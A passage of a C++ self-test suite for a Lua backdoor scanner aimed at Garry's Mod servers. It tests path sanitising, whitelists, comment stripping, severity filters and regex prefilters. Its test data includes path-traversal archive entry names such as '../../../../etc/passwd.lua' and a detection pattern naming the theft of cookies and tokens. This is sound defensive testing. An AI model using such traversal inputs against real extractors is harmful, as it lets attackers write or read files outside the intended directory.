    // The overlap is pinned by the bounded-reach check and by integration.py.
}

static void TestGlobMatching() {
    CHECK(std::regex_match("a/b/c.lua", GlobToRegex("*/b/*.lua")));
    CHECK(std::regex_match("a\\b\\c.lua", GlobToRegex("*/b/*.lua")));
    CHECK(std::regex_match("A/B/C.LUA", GlobToRegex("*/b/*.lua")));
    CHECK(!std::regex_match("a/x/c.lua", GlobToRegex("*/b/*.lua")));
    CHECK(std::regex_match("x.lua", GlobToRegex("?.lua")));
    CHECK(!std::regex_match("xy.lua", GlobToRegex("?.lua")));
    CHECK(std::regex_match("a.b.lua", GlobToRegex("a.b.lua")));
    CHECK(!std::regex_match("axbylua", GlobToRegex("a.b.lua")));
}

static void TestCompositeScope() {
    struct Case {
        const char* root;
        const char* file;
        const char* scope;
    };
    const Case cases[] = {
        { "C:/srv/gm/addons", "C:/srv/gm/addons/alpha/lua/autorun/a.lua", "C:/srv/gm/addons/alpha" },
        { "C:/srv/gm/addons", "C:/srv/gm/addons/beta/lua/autorun/b.lua", "C:/srv/gm/addons/beta" },
        { "C:/srv/gm", "C:/srv/gm/lua/autorun/c.lua", "C:/srv/gm" },
        { "C:/srv/gm", "C:/srv/gm/gamemodes/darkrp/gamemode/init.lua", "C:/srv/gm/gamemodes/darkrp" },
        { "C:/srv/gm/addons", "C:/srv/gm/addons/alpha/materials/x.vmt", "C:/srv/gm/addons/alpha" },
        { "C:/flat", "C:/flat/a.lua", "C:/flat" },

        { "D:/sound/gm/addons", "D:/sound/gm/addons/alpha/lua/a.lua", "D:/sound/gm/addons/alpha" },
        { "D:/sound/gm/addons", "D:/sound/gm/addons/beta/lua/b.lua", "D:/sound/gm/addons/beta" },
        { "D:/lua/srv/addons", "D:/lua/srv/addons/alpha/lua/a.lua", "D:/lua/srv/addons/alpha" },
        { "E:/models/x/addons", "E:/models/x/addons/one/lua/a.lua", "E:/models/x/addons/one" },
        { "F:/resource/a/addons", "F:/resource/a/addons/two/lua/b.lua", "F:/resource/a/addons/two" },
        { "G:/materials/addons", "G:/materials/addons/three/lua/c.lua", "G:/materials/addons/three" },
    };

    for (const Case& test : cases) {
        const std::string scope = CompositeScope(test.file, test.root);
        if (scope != test.scope) {
            std::cerr << "FAIL: CompositeScope(\"" << test.file << "\") == \"" << scope
                      << "\", expected \"" << test.scope << "\"" << std::endl;
            g_failures++;
        }
    }

    CHECK(CompositeScope("D:/sound/gm/addons/alpha/lua/a.lua", "D:/sound/gm/addons") !=
          CompositeScope("D:/sound/gm/addons/beta/lua/b.lua", "D:/sound/gm/addons"));
}

static void TestArchiveEntryNames() {
    struct Case {
        const char* raw;
        const char* expected;
        bool altered;
    };
    const Case cases[] = {
        { "lua/autorun/init.lua", "lua/autorun/init.lua", false },
        { "lua/weapons/gun.lua", "lua/weapons/gun.lua", false },
        { "../addons/trusted/x.lua", "addons/trusted/x.lua", true },
        { "/addons/trusted/x.lua", "addons/trusted/x.lua", true },
        { "lua/../../addons/trusted/x.lua", "addons/trusted/x.lua", true },
        { "C:/addons/trusted/x.lua", "addons/trusted/x.lua", true },
        { "c:\\addons\\trusted\\x.lua", "addons/trusted/x.lua", true },
        { "lua\\autorun\\init.lua", "lua/autorun/init.lua", true },
        { "./lua/init.lua", "lua/init.lua", true },
        { "lua//init.lua", "lua/init.lua", true },
        { "..", "unnamed", true },
        { "", "unnamed", true },
        { "/w:x.lua", "x.lua", true },
        { "/c:/evil.lua", "evil.lua", true },
        { "/c:/d:/e:/x.lua", "x.lua", true },
        { "./C:./C:x.lua", "x.lua", true },
        { "lua/c:config.lua", "lua/config.lua", true },
        { "C:..", "unnamed", true },
    };

    for (const Case& test : cases) {
        bool altered = false;
        const std::string result = GMAReader::SanitizeEntryName(test.raw, altered);
        if (result != test.expected || altered != test.altered) {
            std::cerr << "FAIL: SanitizeEntryName(\"" << test.raw << "\") == \"" << result
                      << "\" (altered " << altered << "), expected \"" << test.expected
                      << "\" (altered " << test.altered << ")" << std::endl;
            g_failures++;
        }
    }

    bool altered = false;
    const std::string escaped = GMAReader::SanitizeEntryName("../../../../etc/passwd.lua", altered);
    CHECK(altered);
    CHECK(escaped.find("..") == std::string::npos);
    CHECK(escaped.front() != '/');

    const std::string awkward[] = {
        "./C:./C:./C:C:./C:./C:.",
        ".ll/.././l:",
        "/w:Cni&dow.",
        std::string("lua/") + '\0' + "x.lua",
        std::string("\xff\xfe") + "bad.lua",
        "c:c:c:c:c:c:c:c:c:x.lua",
        "////../..//c:/..//x",
    };
    for (const std::string& raw : awkward) {
        bool first = false;
        bool second = false;
        const std::string once = GMAReader::SanitizeEntryName(raw, first);
        const std::string twice = GMAReader::SanitizeEntryName(once, second);
        if (once != twice || second) {
            std::cerr << "FAIL: SanitizeEntryName is not stable for \"" << raw
                      << "\": \"" << once << "\" then \"" << twice << "\"" << std::endl;
            g_failures++;
        }
        CHECK(!once.empty());
        CHECK(once.front() != '/');
        CHECK(SanitizeUtf8(once) == once);
        for (char c : once) {
            CHECK(static_cast<unsigned char>(c) >= 0x20);
            CHECK(c != '\\');
        }
        if (once.size() >= 2) {
            CHECK(!(once[1] == ':' && std::isalpha(static_cast<unsigned char>(once[0]))));
        }
    }
}

static void TestWhitelist() {
    const fs::path path = fs::temp_directory_path() / "bdscan_whitelist.txt";
    std::ofstream out(path);
    out << "# comment\n";
    out << "*/addons/ulx/*;;;Console Command Execution\n";
    out << "*/addons/trusted/*\n";
    out << "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\n";
    out.close();

    Whitelist whitelist;
    CHECK(whitelist.Load(path) == 3);
    CHECK(!whitelist.Empty());
    CHECK(whitelist.RuleCount() == 2);
    CHECK(whitelist.HashCount() == 1);

    CHECK(whitelist.IsFileWhitelisted("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"));
    CHECK(!whitelist.IsFileWhitelisted("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"));

    CHECK(whitelist.IsSuppressed("c:/gmod/addons/ulx/lua/x.lua", "[HIGH] Console Command Execution"));
    CHECK(!whitelist.IsSuppressed("c:/gmod/addons/ulx/lua/x.lua", "[CRITICAL] Code Execution (RunString)"));
    CHECK(!whitelist.IsSuppressed("c:/gmod/addons/other/lua/x.lua", "[HIGH] Console Command Execution"));

    CHECK(whitelist.IsSuppressed("c:/gmod/addons/trusted/a.lua", "[CRITICAL] Code Execution (RunString)"));
    CHECK(whitelist.IsSuppressed("c:/gmod/addons/trusted/a.lua", "anything at all"));
    CHECK(!whitelist.IsSuppressed("c:/gmod/addons/untrusted/a.lua", "[CRITICAL] Code Execution (RunString)"));

    Whitelist empty;
    CHECK(empty.Empty());
    CHECK(!empty.IsSuppressed("any/path.lua", "any detection"));

    {
        const fs::path pinnedPath = fs::temp_directory_path() / "bdscan_whitelist_pinned.txt";
        std::ofstream pinnedOut(pinnedPath);
        pinnedOut << "*/gamemodes/base/entities/entities/lua_run.lua;;;"
            << "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" << std::endl;
        pinnedOut.close();

        Whitelist pinned;
        CHECK(pinned.Load(pinnedPath) == 1);
        CHECK(pinned.PinnedCount() == 1);

        const std::string stock = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855";
        const std::string tampered = "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad";
        const std::string stockPath = "c:/gmod/gamemodes/base/entities/entities/lua_run.lua";

        CHECK(pinned.IsFileWhitelisted(stockPath, stock));
        CHECK(!pinned.IsFileWhitelisted(stockPath, tampered));
        CHECK(!pinned.IsFileWhitelisted("c:/gmod/addons/evil/lua_run.lua", stock));
        CHECK(!pinned.IsFileWhitelisted(stock));
    }

    fs::remove(path);
}

static void TestStripComments() {
    const std::string line = "-- RunString(x)\nprint(1)\n";
    const std::string strippedLine = StripLuaComments(line);
    CHECK(strippedLine.size() == line.size());
    CHECK(strippedLine.find("RunString") == std::string::npos);
    CHECK(strippedLine.find("print(1)") != std::string::npos);
    CHECK(std::count(strippedLine.begin(), strippedLine.end(), '\n') == 2);

    const std::string block = "--[[ RunString(x)\nmore ]] print(2)\n";
    const std::string strippedBlock = StripLuaComments(block);
    CHECK(strippedBlock.size() == block.size());
    CHECK(strippedBlock.find("RunString") == std::string::npos);
    CHECK(strippedBlock.find("print(2)") != std::string::npos);
    CHECK(std::count(strippedBlock.begin(), strippedBlock.end(), '\n') ==
          std::count(block.begin(), block.end(), '\n'));

    const std::string levelled = "--[==[ RunString(x) ]==] print(3)";
    CHECK(StripLuaComments(levelled).find("RunString") == std::string::npos);
    CHECK(StripLuaComments(levelled).find("print(3)") != std::string::npos);

    const std::string inString = "print(\"-- not a comment\") RunString(x)";
    const std::string strippedString = StripLuaComments(inString);
    CHECK(strippedString == inString);

    const std::string longString = "local s = [[-- not a comment]] RunString(x)";
    CHECK(StripLuaComments(longString) == longString);

    const std::string escaped = "print(\"a\\\"-- still string\") RunString(x)";
    CHECK(StripLuaComments(escaped).find("RunString") != std::string::npos);

    const std::string unterminated = "--[[ RunString(x)";
    CHECK(StripLuaComments(unterminated).find("RunString") == std::string::npos);
    CHECK(StripLuaComments(unterminated).size() == unterminated.size());

    const std::string minus = "local a = b - c - d";
    CHECK(StripLuaComments(minus) == minus);

    const std::string index = "local v = t[1] - 2";
    CHECK(StripLuaComments(index) == index);
}

static void TestIdParsing() {
    CHECK(IdFromDefinition("[CRITICAL] LUA-001 Code Execution") == "LUA-001");
    CHECK(IdFromDefinition("[HIGH] BIN-013 Multiple Hex Escapes") == "BIN-013");
    CHECK(IdFromDefinition("[LOW] Something without an id") == "");
    CHECK(IdFromDefinition("[MEDIUM] lua-001 lowercase is not an id") == "");
    CHECK(IdFromDefinition("no tag at all") == "");
}

static void TestSeverityHelpers() {
    CHECK(SeverityFromDefinition("[CRITICAL] x") == "critical");
    CHECK(SeverityFromDefinition("[HIGH] x") == "high");
    CHECK(SeverityFromDefinition("[MEDIUM] x") == "medium");
    CHECK(SeverityFromDefinition("[LOW] x") == "low");
    CHECK(SeverityFromDefinition("no tag") == "");

    CHECK(SeverityRank("critical") < SeverityRank("high"));
    CHECK(SeverityRank("high") < SeverityRank("medium"));
    CHECK(SeverityRank("medium") < SeverityRank("low"));

    CHECK(SeverityWeight("critical") > SeverityWeight("high"));
    CHECK(SeverityWeight("high") > SeverityWeight("medium"));
    CHECK(SeverityWeight("medium") > SeverityWeight("low"));

    CHECK(MeetsSeverityThreshold("low", "low"));
    CHECK(!MeetsSeverityThreshold("low", "medium"));
    CHECK(MeetsSeverityThreshold("medium", "medium"));
    CHECK(MeetsSeverityThreshold("critical", "high"));
    CHECK(!MeetsSeverityThreshold("high", "critical"));
    CHECK(MeetsSeverityThreshold("critical", "critical"));

    CHECK(IsValidSeverity("low"));
    CHECK(IsValidSeverity("critical"));
    CHECK(!IsValidSeverity("bogus"));
}

static void TestReportFilter() {
    const fs::path path = fs::temp_directory_path() / "bdscan_filter_whitelist.txt";
    std::ofstream out(path);
    out << "*/ulx/*;;;Console Command\n";
    out.close();
    Whitelist whitelist;
    whitelist.Load(path);
    fs::remove(path);

    ReportFilter filter;
    filter.SetMinSeverity("medium");
    filter.SetWhitelist(&whitelist);

    CHECK(filter.Evaluate(MakeDetection("a.lua", 1, "[CRITICAL] RunString", "critical")) == Verdict::Report);
    CHECK(filter.Evaluate(MakeDetection("a.lua", 1, "[CRITICAL] RunString", "critical")) == Verdict::Duplicate);
    CHECK(filter.Evaluate(MakeDetection("a.lua", 2, "[CRITICAL] RunString", "critical")) == Verdict::Report);
    CHECK(filter.Evaluate(MakeDetection("a.lua", 3, "[LOW] Something", "low")) == Verdict::BelowSeverity);
    CHECK(filter.Evaluate(MakeDetection("a.lua", 4, "[MEDIUM] Something", "medium")) == Verdict::Report);
    CHECK(filter.Evaluate(MakeDetection("x/ulx/a.lua", 5, "[HIGH] Console Command", "high")) == Verdict::Whitelisted);
    CHECK(filter.Evaluate(MakeDetection("x/other/a.lua", 5, "[HIGH] Console Command", "high")) == Verdict::Report);

    CHECK(filter.Count(Verdict::Report) == 4);
    CHECK(filter.Count(Verdict::Duplicate) == 1);
    CHECK(filter.Count(Verdict::BelowSeverity) == 1);
    CHECK(filter.Count(Verdict::Whitelisted) == 1);
    CHECK(filter.Count(Verdict::InBaseline) == 0);
    CHECK(!filter.DiffMode());

    ReportFilter diff;
    const Detection known = MakeDetection("b.lua", 7, "[CRITICAL] RunString", "critical");
    diff.SetBaseline({ ReportFilter::Key(known) });
    CHECK(diff.DiffMode());
    CHECK(diff.BaselineSize() == 1);
    CHECK(diff.Evaluate(known) == Verdict::InBaseline);
    CHECK(diff.Evaluate(MakeDetection("b.lua", 8, "[CRITICAL] RunString", "critical")) == Verdict::Report);
    CHECK(diff.Evaluate(MakeDetection("b.lua", 7, "[HIGH] Other", "high")) == Verdict::Report);
    CHECK(diff.Count(Verdict::InBaseline) == 1);

    CHECK(ReportFilter::Key(known) == "b.lua:7:[CRITICAL] RunString:");
    Detection original = known;
    original.fingerprint = SHA256::Hash("old content");
    ReportFilter changed;
    changed.SetBaseline({ ReportFilter::Key(original) });
    CHECK(changed.Evaluate(original) == Verdict::InBaseline);
    Detection replacement = original;
    replacement.fingerprint = SHA256::Hash("replacement on the same line");
    CHECK(changed.Evaluate(replacement) == Verdict::Report);
}

static void TestFileScores() {
    std::vector<Detection> detections = {
        MakeDetection("noisy.lua", 1, "[HIGH] Console Command", "high"),
        MakeDetection("noisy.lua", 2, "[HIGH] Console Command", "high"),
        MakeDetection("noisy.lua", 3, "[HIGH] Console Command", "high"),
        MakeDetection("noisy.lua", 4, "[HIGH] Console Command", "high"),
        MakeDetection("noisy.lua", 5, "[HIGH] Console Command", "high"),
        MakeDetection("backdoor.lua", 1, "[CRITICAL] Remote Code Execution", "critical"),
        MakeDetection("backdoor.lua", 3, "[CRITICAL] RunString", "critical"),
        MakeDetection("backdoor.lua", 9, "[HIGH] Registry Access", "high"),
        MakeDetection("minor.lua", 1, "[MEDIUM] File Deletion", "medium"),
    };

    const std::vector<FileScore> scores = ComputeFileScores(detections);
    CHECK(scores.size() == 3);
    if (scores.size() == 3) {
        CHECK(scores[0].file == "backdoor.lua");
        CHECK(scores[0].score == 23);
        CHECK(scores[0].detections == 3);
        CHECK(scores[0].distinctTypes == 3);
        CHECK(scores[0].critical == 2);
        CHECK(scores[0].high == 1);

        CHECK(scores[1].file == "noisy.lua");
        CHECK(scores[1].score == 3);
        CHECK(scores[1].detections == 5);
        CHECK(scores[1].distinctTypes == 1);

        CHECK(scores[2].file == "minor.lua");
        CHECK(scores[2].score == 1);
    }

    CHECK(ComputeFileScores({}).empty());

    std::vector<Detection> tie = {
        MakeDetection("b.lua", 1, "[HIGH] X", "high"),
        MakeDetection("a.lua", 1, "[HIGH] X", "high"),
    };
    const std::vector<FileScore> tied = ComputeFileScores(tie);
    CHECK(tied.size() == 2);
    if (tied.size() == 2) CHECK(tied[0].file == "a.lua");

    std::vector<Detection> unsorted = {
        MakeDetection("b.lua", 2, "[HIGH] X", "high"),
        MakeDetection("a.lua", 9, "[HIGH] X", "high"),
        MakeDetection("a.lua", 1, "[HIGH] Z", "high"),
        MakeDetection("a.lua", 1, "[HIGH] Y", "high"),
    };
    std::sort(unsorted.begin(), unsorted.end(), DetectionOrder);
    CHECK(unsorted[0].file == "a.lua" && unsorted[0].lineNumber == 1 && unsorted[0].detection == "[HIGH] Y");
    CHECK(unsorted[1].file == "a.lua" && unsorted[1].lineNumber == 1 && unsorted[1].detection == "[HIGH] Z");
    CHECK(unsorted[2].file == "a.lua" && unsorted[2].lineNumber == 9);
    CHECK(unsorted[3].file == "b.lua");
}

static fs::path FindRuleDirectory(int argc, char** argv) {
    std::vector<fs::path> candidates;
    if (argc > 1) candidates.push_back(fs::path(argv[1]));
    candidates.push_back(fs::path(__FILE__).parent_path().parent_path());
    candidates.push_back(fs::path("BD-Scan"));
    candidates.push_back(fs::current_path());

    std::error_code ec;
    for (const fs::path& candidate : candidates) {
        if (candidate.empty()) continue;
        if (fs::exists(candidate / "lua_patterns.txt", ec) && !ec) return candidate;
    }
    return {};
}

static void TestCompositeExpressions() {
    const std::map<std::string, int> abc = { { "LUA-001", 1 }, { "LUA-002", 3 }, { "BIN-014", 1 } };
    const std::map<std::string, int> none;

    struct Case { const char* text; bool withAbc; bool withNone; };
    const Case cases[] = {
        { "LUA-001",                              true,  false },
        { "LUA-999",                              false, false },
        { "LUA-001 and LUA-002",                  true,  false },
        { "LUA-001 and LUA-999",                  false, false },
        { "LUA-999 or LUA-002",                   true,  false },
        { "not LUA-999",                          true,  true  },
        { "not LUA-001",                          false, true  },
        { "LUA-001 and not LUA-999",              true,  false },
        { "(LUA-999 or LUA-001) and BIN-014",     true,  false },
        { "LUA-999 or (LUA-001 and BIN-014)",     true,  false },
        { "atleast(2, LUA-001, LUA-002, LUA-999)", true, false },
        { "atleast(3, LUA-001, LUA-002, LUA-999)", false, false },
        { "atleast(1, LUA-999)",                  false, false },
    };

    for (const Case& test : cases) {
        CompositeExpression expression;
        std::string error;
        const bool parsed = expression.Parse(test.text, error);
        if (!parsed) {
            std::cerr << "FAIL: could not parse '" << test.text << "': " << error << std::endl;
            g_failures++;
            continue;
        }
        if (expression.Evaluate(abc) != test.withAbc || expression.Evaluate(none) != test.withNone) {
            std::cerr << "FAIL: '" << test.text << "' evaluated wrongly" << std::endl;
            g_failures++;
        }
    }

    const char* invalid[] = {
        "", "and", "LUA-001 and", "(LUA-001", "LUA-001)", "not", "lua-001",
        "atleast(LUA-001)", "atleast(2)", "atleast(9, LUA-001)", "atleast 2, LUA-001)",
    };
    for (const char* text : invalid) {
        CompositeExpression expression;
        std::string error;
        if (expression.Parse(text, error)) {
            std::cerr << "FAIL: '" << text << "' should not parse" << std::endl;
            g_failures++;
        }
        else {
            CHECK(!error.empty());
        }
    }

    CompositeExpression ids;
    std::string error;
    CHECK(ids.Parse("LUA-001 and (BIN-014 or not LUA-002)", error));
    std::set<std::string> collected;
    ids.CollectIds(collected);
    CHECK(collected.size() == 3);
    CHECK(collected.count("LUA-001") == 1);
    CHECK(collected.count("BIN-014") == 1);
    CHECK(collected.count("LUA-002") == 1);
}

static std::map<std::string, int> ParseIdSet(const std::string& spec) {
    std::map<std::string, int> counts;
    std::string current;
    for (char c : spec) {
        if (c == ',' || std::isspace(static_cast<unsigned char>(c))) {
            if (!current.empty()) { counts[current]++; current.clear(); }
        }
        else current += c;
    }
    if (!current.empty()) counts[current]++;
    return counts;
}

static void RunCompositeTests(const fs::path& ruleDir, const PatternSet& patterns) {
    CompositeRuleSet composites;
    if (!composites.Load(ruleDir / "composite_rules.txt", patterns)) {
        std::cerr << "FAIL: composite_rules.txt could not be loaded" << std::endl;
        g_failures++;
        return;
    }
    CHECK(composites.Count() > 0);

    std::vector<PatternTest> tests;
    if (!LoadPatternTests(ruleDir / "composite_rules.test.txt", ".lua", tests)) {
        std::cerr << "FAIL: composite_rules.test.txt could not be loaded" << std::endl;
        g_failures++;
        return;
    }

    std::map<std::string, const CompositeRule*> byId;
    for (const CompositeRule& rule : composites.Rules()) byId[rule.id] = &rule;

    std::set<std::string> positives;
    std::set<std::string> negatives;
    Scanner scanner(patterns);

    for (const PatternTest& test : tests) {
        const auto found = byId.find(test.id);
        if (found == byId.end()) {
            std::cerr << "FAIL composite_rules.test.txt:" << test.lineNumber
                      << ": unknown composite id " << test.id << std::endl;
            g_failures++;
            continue;
        }
        const CompositeRule& rule = *found->second;

        bool matched = false;
        const std::string idPrefix = "ids:";
        if (test.snippet.rfind(idPrefix, 0) == 0) {
            matched = rule.expression.Evaluate(ParseIdSet(test.snippet.substr(idPrefix.size())));
        }
        else if (rule.scanLevel) {
            std::cerr << "FAIL composite_rules.test.txt:" << test.lineNumber << ": " << test.id
                      << " is a scan-level rule and needs an 'ids:' case" << std::endl;
            g_failures++;
            continue;
        }
        else {
            std::map<std::string, int> counts;
            scanner.Scan(test.snippet, "composite-test.lua", ".lua",
                         [&](const Detection& detection) {
                             if (!detection.id.empty()) counts[detection.id]++;
                         });
            matched = rule.expression.Evaluate(counts);
        }

        if (matched != test.expectMatch) {
            std::cerr << "FAIL composite_rules.test.txt:" << test.lineNumber << ": " << test.id
                      << " expected " << (test.expectMatch ? "a match" : "no match")
                      << " for: " << test.snippet << std::endl;
            g_failures++;
        }
        (test.expectMatch ? positives : negatives).insert(test.id);
    }

    for (const CompositeRule& rule : composites.Rules()) {
        if (positives.count(rule.id) == 0) {
            std::cerr << "FAIL: composite " << rule.id << " has no positive (+) test case" << std::endl;
            g_failures++;
        }
        if (negatives.count(rule.id) == 0) {
            std::cerr << "FAIL: composite " << rule.id << " has no negative (-) test case" << std::endl;
            g_failures++;
        }
    }

    std::cout << "selfcheck: " << tests.size() << " composite cases over "
              << composites.Count() << " rules ("
              << composites.CountAtLevel(true) << " scan-level)" << std::endl;
}

static void TestLiteralExtraction() {
    struct Case { const char* expression; std::vector<std::string> expected; };
    const Case cases[] = {
        { R"(\bRunString\s*\()",                    { "RunString" } },
        { R"(\bRunString(?:Ex)?\s*\()",             { "RunString" } },
        { R"(\bdebug\.getregistry\s*\()",           { "debug.getregistry" } },
        { R"(\bsql\.(?:Query|QueryValue)\s*\()",    { "Query", "QueryValue" } },
        { R"(\b(?:getfenv|setfenv)\s*\()",          { "getfenv", "setfenv" } },
        { R"(hook\.Add\s*\([\s\S]{0,400}?RunString)", { "RunString" } },
        { R"(_G\s*\[[^"'\]]{1,200}\])",             {} },
        { R"([0-9]{2,3}(?:,[0-9]{2,3}){6,})",       {} },
        { R"(\\x[0-9a-fA-F]{2}\\x[0-9a-fA-F]{2})",  {} },
        { R"(0[xX][0-9a-fA-F]{16,})",               {} },
        { R"(ab)",                                  {} },
    };

    for (const Case& test : cases) {
        std::vector<std::string> got = LiteralExtractor::Required(test.expression);
        std::sort(got.begin(), got.end());
        std::vector<std::string> want = test.expected;
        std::sort(want.begin(), want.end());

        if (got != want) {
            std::cerr << "FAIL literal extraction for " << test.expression << ": got {";
            for (const std::string& literal : got) std::cerr << " '" << literal << "'";
            std::cerr << " }, want {";
            for (const std::string& literal : want) std::cerr << " '" << literal << "'";
            std::cerr << " }" << std::endl;
            g_failures++;
        }
    }
}

static void TestPrefilterNecessity() {
    struct Case { const char* expression; const char* subject; };
    const Case cases[] = {
        { R"(RunString\s*\()",                      "RunString (" },
        { R"(alpha{2,3}bravocharlie)",              "alphaaabravocharlie" },
        { R"(alpha{0,3}bravocharlie)",              "alphbravocharlie" },
        { R"((?:steal|grab)(?:cookies|tokens))",    "grabtokens" },
        { R"((?=abcdef)abcdefword)",                "abcdefword" },
        { R"((?!nope)actualtext)",                  "actualtext" },
        { R"(prefix(?:middle)?suffixword)",         "prefixsuffixword" },
        { R"(prefix(?:middle)*suffixword)",         "prefixsuffixword" },
        { R"(prefix(?:middle)+suffixword)",         "prefixmiddlesuffixword" },
        { R"(char[abc]classword)",                  "charbclassword" },
        { R"(char[^abc]classword)",                 "charzclassword" },
        { R"(esc\.dot\.word)",                      "esc.dot.word" },
        { R"(back\\slashword)",                     "back\\slashword" },
        { R"(a|bb|ccc)",                            "ccc" },
        { R"((one|two)three(four|five))",           "twothreefive" },
        { R"(opt?ionalword)",                       "optionalword" },
        { R"(opt?ionalword)",                       "opionalword" },
        { R"(dot.matches.anything)",                "dotXmatchesYanything" },
        { R"(^anchoredword)",                       "anchoredword" },
        { R"(trailingword$)",                       "trailingword" },
        { R"(nested((deep|deeper)core)tail)",       "nesteddeepcoretail" },
        { R"(trail\d{1,9}ing)",                     "trail12345ing" },
        { R"(http\.Fetch\s*\()",                    "http.Fetch (" },
        { R"(net\.Receive\s*\(\s*["']\w+["'])",     "net.Receive(\"hook\"" },
        { R"((?:a|b)(?:c|d)(?:e|f))",               "ace" },
        { R"(longliteral(?:tiny)?)",                "longliteral" },
        { R"((?:deep(?:er(?:est)?)?)nesting)",      "deepnesting" },
        { R"(escaped\|pipe\|word)",                 "escaped|pipe|word" },
        { R"(posix[[:alpha:]]classword)",           "posixQclassword" },
        { R"(posix[[:digit:]]+markerword)",         "posix1234markerword" },
        { R"(mixed[[:space:]a-z]tailword)",         "mixedqtailword" },
        { R"(classdash[a-z-]tailword)",             "classdashqtailword" },
        { R"(bracketin[a\]b]tailword)",             "bracketin]tailword" },
    };

    for (const Case& test : cases) {
        const std::vector<std::string> literals = LiteralExtractor::Required(test.expression);
        if (literals.empty()) continue;

        const std::string subject = test.subject;
        try {
            const std::regex regex(test.expression, std::regex::ECMAScript);
            if (!std::regex_search(subject, regex)) {
                std::cerr << "FAIL prefilter case is wrong, " << test.expression
                          << " does not match \"" << subject << "\"" << std::endl;
                g_failures++;
                continue;
            }
        } catch (const std::regex_error& error) {
            std::cerr << "FAIL prefilter case is wrong, " << test.expression
                      << " does not compile: " << error.what() << std::endl;
            g_failures++;
            continue;
        }

        bool present = false;
        for (const std::string& literal : literals) {
            if (subject.find(literal) != std::string::npos) { present = true; break; }
        }
        if (!present) {
            std::cerr << "FAIL prefilter would skip " << test.expression
                      << " on the matching text \"" << subject << "\", it requires {";
            for (const std::string& literal : literals) std::cerr << " '" << literal << "'";
            std::cerr << " }" << std::endl;
            g_failures++;
        }
    }

    std::cout << "selfcheck: " << (sizeof(cases) / sizeof(cases[0]))
              << " prefilter literals checked against the text they must not hide" << std::endl;
}

static bool DecodesAsUtf8(const std::string& text, std::string& why) {
    size_t i = 0;
    while (i < text.size()) {
        const unsigned char c = static_cast<unsigned char>(text[i]);
        if (c < 0x20 || c == 0x7f) { why = "control byte"; return false; }
        if (c < 0x80) { i++; continue; }

        size_t need = 0;
        unsigned int code = 0;
        if ((c & 0xe0) == 0xc0) { need = 1; code = c & 0x1fu; }
        else if ((c & 0xf0) == 0xe0) { need = 2; code = c & 0x0fu; }
        else if ((c & 0xf8) == 0xf0) { need = 3; code = c & 0x07u; }
        else { why = "bad lead byte"; return false; }

        if (i + need >= text.size()) { why = "truncated"; return false; }
        for (size_t j = 1; j <= need; ++j) {
            const unsigned char next = static_cast<unsigned char>(text[i + j]);
            if ((next & 0xc0) != 0x80) { why = "bad continuation"; return false; }
            code = (code << 6) | (next & 0x3fu);
        }
        if (need == 1 && code < 0x80) { why = "overlong"; return false; }
        if (need == 2 && code < 0x800) { why = "overlong"; return false; }
        if (need == 3 && code < 0x10000) { why = "overlong"; return false; }
        if (code >= 0xd800 && code <= 0xdfff) { why = "surrogate"; return false; }
        if (code > 0x10ffff) { why = "out of range"; return false; }
        i += need + 1;
    }
    return true;
}

static void TestUtf8Sanitiser() {
    const std::string fixed[] = {
        "", "addons/mod/lua/x.lua", "caf\xc3\xa9", "\xe6\x97\xa5\xe6\x9c\xac",
        "\xf0\x9f\x92\xa9", std::string("a\x80\x81"), std::string("a\xc3"),
        std::string("a\xe6\x97"), std::string("a\xf0\x9f\x92"), std::string("\xc0\xaf"),
        std::string("\xc0\x80"), std::string("\xe0\x80\xaf"), std::string("\xf0\x80\x80\xaf"),
        std::string("\xed\xa0\x80"), std::string("\xed\xa0\xbd\xed\xb2\xa9"),
        std::string("\xf4\x90\x80\x80"), std::string("\xfe\xff"), std::string("\xff"),
        std::string("a\0b", 3), "a\nb\tc\rd", std::string("a\x7f" "b"),
        std::string("\xef\xbb\xbf" "x"), std::string(64, '\x9f'), std::string("caf\xc3\xa9\xc3"),
    };

    size_t checked = 0;
    auto examine = [&](const std::string& raw, const char* label) {
        const std::string cleaned = SanitizeUtf8(raw);
        std::string why;
        checked++;
        if (!DecodesAsUtf8(cleaned, why)) {
            std::cerr << "FAIL sanitised " << label << " is not valid UTF-8: " << why << std::endl;
            g_failures++;
        }
        if (SanitizeUtf8(cleaned) != cleaned) {
            std::cerr << "FAIL sanitised " << label << " changes again on a second pass" << std::endl;
            g_failures++;
        }
    };

    for (const std::string& raw : fixed) examine(raw, "fixture");

    std::mt19937 rng(20260918);
    std::uniform_int_distribution<int> byte(0, 255);
    std::uniform_int_distribution<int> length(0, 40);
    for (int round = 0; round < 50000; ++round) {
        std::string raw;
        const int n = length(rng);
        for (int i = 0; i < n; ++i) raw += static_cast<char>(byte(rng));
        examine(raw, "random bytes");
    }

    std::cout << "selfcheck: " << checked
              << " byte strings sanitised, every result valid UTF-8 and unchanged by a"
                 " second pass" << std::endl;
}

static void TestCatastrophicShapes(const PatternSet& patterns) {
    struct Case { const char* expression; bool refuse; };
    const Case cases[] = {
        { R"((a+)+b)",                       true },
        { R"((a*)*b)",                       true },
        { R"((a+)*b)",                       true },
        { R"((a*)+b)",                       true },
        { R"((?:a+)+b)",                     true },
        { R"((?:x{2,})+y)",                  true },
        { R"(((a|b)+)+c)",                   true },
        { R"((\w*)*b)",                      true },
        { R"(x(\d+)+y)",                     true },
        { R"(prefix(?:\s*\w+)*suffix)",      true },
        { R"(((a+)(b))+c)",                  true },

        { R"((?:ab)+c)",                     false },
        { R"((?:a|b)+c)",                    false },
        { R"((abc)*d)",                      false },
        { R"((?:,[0-9]{2,3}){6,})",          false },
        { R"([0-9]{2,3}(?:,[0-9]{2,3}){6,})", false },
        { R"((a+){3}b)",                     false },
        { R"((a+)?b)",                       false },
        { R"((a+){2,5}b)",                   false },
        { R"(\bRunString\s*\()",             false },
        { R"([A-Za-z0-9+/]{80,}={0,2})",     false },
        { R"(\(a+\)+b)",                     false },
        { R"([(]+a)",                        false },
        { R"((a\+)+b)",                      false },
        { R"((\\)+b)",                       false },
        { R"(((a)(b))+c)",                   false },
        { R"((x(?:y)z)+w)",                  false },
    };

    for (const Case& test : cases) {
        if (RepeatsARepeat(test.expression) != test.refuse) {
